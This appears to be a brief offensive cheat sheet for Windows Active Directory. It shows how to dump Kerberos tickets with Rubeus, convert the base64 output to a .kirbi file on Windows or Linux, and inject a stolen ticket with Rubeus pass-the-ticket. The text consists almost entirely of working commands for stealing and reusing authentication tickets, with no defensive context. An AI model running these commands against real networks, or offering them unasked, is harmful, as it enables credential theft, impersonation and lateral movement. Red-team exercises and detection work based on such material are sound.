Dump the tickets on base64
./Rubeus.exe dump
To change the base64 dumped TGT to a kirbi file, use this on windows:
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String(""))
Or in linux:
echo 'BASE64' | base64 -d > ticket.kirbi
To use the ticket on linux, you will need to change the ticket from kirbi to ccache using ticket_converter.

To use the ticket on windows just use:
Load the tickets on base64 or from kirbi file.
./Rubeus.exe ptt </ticket:BASE64 | /ticket:FILE.KIRBI>
